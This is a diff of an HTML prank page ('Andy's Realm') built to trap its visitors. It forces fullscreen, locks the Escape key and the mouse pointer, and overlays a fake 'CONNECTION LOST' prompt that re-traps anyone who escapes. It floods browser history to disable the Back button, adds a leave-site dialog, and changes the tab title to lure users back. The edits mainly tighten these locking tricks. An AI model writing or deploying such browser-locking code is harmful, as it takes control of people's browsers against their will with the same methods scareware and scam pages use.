@@ -12,16 +12,17 @@
             background-repeat: no-repeat, repeat-y, repeat-y;
             background-size: contain, auto 100%, auto 100%;
             min-height: 100vh; margin: 0; overflow: hidden; background-color: black;
+            /* Transition makes the shake feel more violent */
             transition: transform 0.05s linear;
         }
 
-        /* Animations */
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         .andy-1 { width: 150px; position: absolute; top: 50%; z-index: 10; animation: moveSide 4s ease-in-out infinite alternate, rotate 1s linear infinite; }
         .andy-2 { width: 150px; position: absolute; left: 20px; z-index: 10; animation: moveUpAndDown 5s ease-in-out infinite alternate, rotate 4s linear infinite; }
         .andy-3 { width: 150px; position: absolute; right: 20px; z-index: 10; animation: moveUpAndDown 6s ease-in-out infinite alternate, rotate 2s linear infinite; }
         .andy-circle-container { position: absolute; top: 50%; left: 50%; width: 10px; height: 10px; z-index: 11; animation: circlePath 10s linear infinite; }
         .andy-4 { width: 120px; animation: rotate 2.5s linear infinite; }
+        
         @keyframes moveSide { from { left: 0%; } to { left: calc(100% - 150px); } }
         @keyframes moveUpAndDown { from { top: 0%; } to { top: calc(100% - 150px); } }
         @keyframes circlePath { from { transform: rotate(0deg) translateX(250px) rotate(0deg); } to { transform: rotate(360deg) translateX(250px) rotate(-360deg); } }
@@ -32,10 +33,9 @@
             display: flex; justify-content: center; align-items: center;
         }
 
-        /* Fake "Locked" Overlay if they exit fullscreen */
         #fullscreen-trap {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); z-index: 10000; cursor: pointer;
+            background: rgba(0,0,0,0.85); z-index: 10000; cursor: pointer;
             color: white; font-family: sans-serif; text-align: center; padding-top: 20%;
         }
     </style>
@@ -44,8 +44,8 @@
     <div id="conf"><input type="button" value="click for mythical andy" onclick="start()"></div>
     
     <div id="fullscreen-trap" onclick="forceFullscreen()">
-        <h1>FULLSCREEN DISCONNECTED</h1>
-        <p>CLICK TO RE-ESTABLISH CONNECTION TO ANDY</p>
+        <h1>CONNECTION LOST</h1>
+        <p>CLICK TO RE-ENTER THE REALM</p>
     </div>
     
     <img src="andyspin.jpg" class="andy-1"><img src="andyspin2.jpg" class="andy-2"><img src="andyspin3.jpg" class="andy-3">
@@ -55,12 +55,15 @@
     <script>
         const trap = document.getElementById('fullscreen-trap');
 
-        // Screen Shake
-        document.addEventListener('mousemove', () => {
+        // FIXED SHAKE: Uses movementX/Y to work during Pointer Lock
+        document.addEventListener('mousemove', (e) => {
             if (document.getElementById('conf').style.display === 'none') {
-                const x = Math.random() * 20 - 10;
-                const y = Math.random() * 20 - 10;
-                document.body.style.transform = `translate(${x}px, ${y}px)`;
+                if (Math.abs(e.movementX) > 0 || Math.abs(e.movementY) > 0) {
+                    const intensity = 15;
+                    const x = (Math.random() - 0.5) * intensity;
+                    const y = (Math.random() - 0.5) * intensity;
+                    document.body.style.transform = `translate(${x}px, ${y}px)`;
+                }
             }
         });
 
@@ -69,16 +72,19 @@
             try {
                 if (elem.requestFullscreen) await elem.requestFullscreen();
                 
-                // Block Esc key (Chrome/Edge only)
-                if (navigator.keyboard) await navigator.keyboard.lock(["Escape"]);
+                // Blocks single-press Esc in Chrome/Edge
+                if (navigator.keyboard && navigator.keyboard.lock) {
+                    await navigator.keyboard.lock(["Escape"]);
+                }
 
-                // Pointer Lock: Mouse is now TRAPPED in the window
+                // Traps mouse cursor inside the browser window
                 if (elem.requestPointerLock) elem.requestPointerLock();
                 
                 trap.style.display = 'none';
             } catch (err) {}
         }
 
+        // Detects if the user breaks out of fullscreen
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement) trap.style.display = 'block';
         });
@@ -88,24 +94,21 @@
             document.querySelector('#jump').play();
             forceFullscreen();
 
-            // History Loop
+            // Prevents "Back" button navigation
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => { window.history.go(1); };
             
-            // Leave Dialog
+            // Standard browser "Leave site?" popup
             window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
 
+            // Constantly pushes new states to history
             setInterval(() => {
                 window.history.pushState(null, "", window.location.href);
             }, 100);
 
-            // TAB STEALING TITLE: Final Measure
+            // Tab-stealing title: Changes text when user switches tabs
             document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    document.title = "COME BACK TO ANDY";
-                } else {
-                    document.title = "Andy's Realm";
-                }
+                document.title = document.hidden ? "COME BACK TO ANDY" : "Andy's Realm";
             });
         }
     </script>
